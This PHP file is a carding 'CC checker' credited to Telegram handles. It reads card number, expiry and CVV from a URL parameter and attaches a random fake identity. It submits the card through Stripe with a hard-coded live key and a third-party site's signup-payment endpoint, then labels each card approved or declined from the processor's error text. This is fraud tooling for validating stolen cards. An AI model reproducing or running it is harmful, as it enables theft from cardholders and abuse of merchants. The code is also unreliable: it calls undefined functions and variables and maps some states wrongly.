<?php
#[ SITE & CODED BY - PERKENT ]
#[ CONTACT DETAILS ON TELEGRAM 👇 ]
#[ @Perkent | @Shelbybhaya ]
#[ CHANNEL - @DRAGONCCCHECKER ]

#==================[SETUP]
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');
function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
#==============[Randomizing Details Api]
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$email = value($resposta, '"email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 
#=====================[1st REQ]
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: api.stripe.com';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"';
$headers[] = 'accept: application/json';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'save-data: on';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11; CPH2127) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'origin: https://js.stripe.com';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://js.stripe.com/';
$headers[] = 'accept-language: en-US,en;q=0.9,hi;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=8a222f87-65f7-4425-a54a-b6349c1249bf0c6a7f&muid=c8456f5f-5122-42a9-b245-6f3901c64c3057282b&sid=6a75bba9-d2c3-4b9c-829a-edb48221b5f0138f50&pasted_fields=number&payment_user_agent=stripe.js%2Faa9485558%3B+stripe-js-v3%2Faa9485558&time_on_page=2518711&key=pk_live_NGJsMv0MLmtsBQknbpBwDYcE');


$result1 = curl_exec($ch);
$tk = trim(strip_tags(getStr($result1,'"id": "','"')));

#==================[2 REQ]
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://criticalcss.com/api/premium/signup-payment');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: criticalcss.com';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"';
$headers[] = 'accept: application/json';
$headers[] = 'content-type: application/json';
$headers[] = 'sec-ch-ua-mobile: ?1';
$headers[] = 'save-data: on';
$headers[] = 'user-agent: Mozilla/5.0 (Linux; Android 11; CPH2127) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36';
$headers[] = 'sec-ch-ua-platform: "Android"';
$headers[] = 'origin: https://criticalcss.com';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'accept-language: en-US,en;q=0.9,hi;q=0.8';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"email":"'.$email.'","plan":"price_1HwBoaLYNoSq08J0Q92yIKGh","quantity":1,"customerId":"cus_LPAkff7eywLDrE","protect":"TP2WRyxFxcBYXCXcz@uTmKhs","paymentMethodId":"'.$id.'","sp":"QQhgHmQ2eDDG)PEoZAXNXeEy"}');
$result2 = curl_exec($ch);
$tk2 = trim(strip_tags(getStr($result2,'"id": "','"')));


#===============[Card Response]
if (strpos($result33, '"cvc_check": "pass"')) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-white">✓</span> <span class="badge badge-white"> ★ CVV MATCHED HYPER ♛ </span></br>';
}
elseif(strpos($result3, "Thank You For Donation." )) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-white">✓</span> <span class="badge badge-white"> ★ CVV MATCHED HYPER ♛ </span></br>';
}
elseif(strpos($result3, "Thank You." )) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-white">✓</span> <span class="badge badge-white"> ★ CVC MATCHED HYPER </span></br>';
}
if(strpos($result3, "Your card's security code is incorrect")) {

  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . ' </span> <span class="badge badge-pink">✓</span> <span class="badge badge-pink"> ★ CCN MATCHED [HYPER] ♛ </span></br>'; 

}
elseif(strpos($result3, 'Your card zip code is incorrect.' )) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-white">✓</span> <span class="badge badge-white"> ★ CVC MATCHED - Incorrect Zip HYPER♛ </span></br>';
}
elseif(strpos($result3, 'Your card has insufficient funds.')) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-pink">✓</span> <span class="badge badge-pink"> ★ Insufficient Funds HYPER♛ </span></br>';
}
elseif(strpos($result3, 'Your card has expired.')) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Card Expired HYPER♛</span> </br>';
}
elseif (strpos($result3, "pickup_card")) {
  echo '<span class="badge badge-white">Aprovadas</span> <span class="badge badge-white">✓</span> <span class="badge badge-white">' . $lista . '</span> <span class="badge badge-pink">✓</span> <span class="badge badge-pink"> ★ Pickup Card_Card - Sometime Useable HYPER ♛ </span></br>';
}
elseif(strpos($result3, 'Your card number is incorrect.')) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Incorrect Card Number HYPER ♛</span> </br>';
}
 elseif (strpos($result3, "incorrect_number")) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Incorrect Card Number HYPER♛</span> </br>';
}
elseif(strpos($result3, 'Your card was declined.')) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Card Declined HYPER ♛</span> </br>';
}
elseif (strpos($result3, "generic_decline")) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Declined : Generic_Decline HYPER♛</span> </br>';
}
elseif (strpos($result3, "do_not_honor")) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Declined : Do_Not_Honor HYPER ♛</span> </br>';
}
elseif (strpos($result3, '"cvc_check": "unchecked"')) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Security Code Check : Unchecked [Proxy Dead] HYPER ♛</span> </br>';
}
elseif (strpos($result3, '"cvc_check": "fail"')) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Security Code Check : Fail HYPER♛</span> </br>';
}
elseif (strpos($result3, "expired_card")) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Expired Card HYPER ♛</span> </br>';
}
elseif (strpos($result3,'Your card does not support this type of purchase.')) {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ Card Doesnt Support This Purchase HYPER ♛</span> </br>';
}

else {
  echo '<span class="new badge red">Reprovadas</span> <span class="new badge red">✕</span> <span class="new badge red">' . $lista . ' </span> <span class="new badge red">✕</span> <span class="badge badge-pink"> ★ '.$msg.' [HYPER] ♛</span> </br>';
}

curl_close($ch);
ob_flush();
echo $result2;

#[ SITE & CODED BY - PERKENT ]
#[ CONTACT DETAILS ON TELEGRAM 👇 ]
#[ @Perkent | @Shelbybhaya ]
#[ CHANNEL - @DRAGONCCCHECKER ]

?>
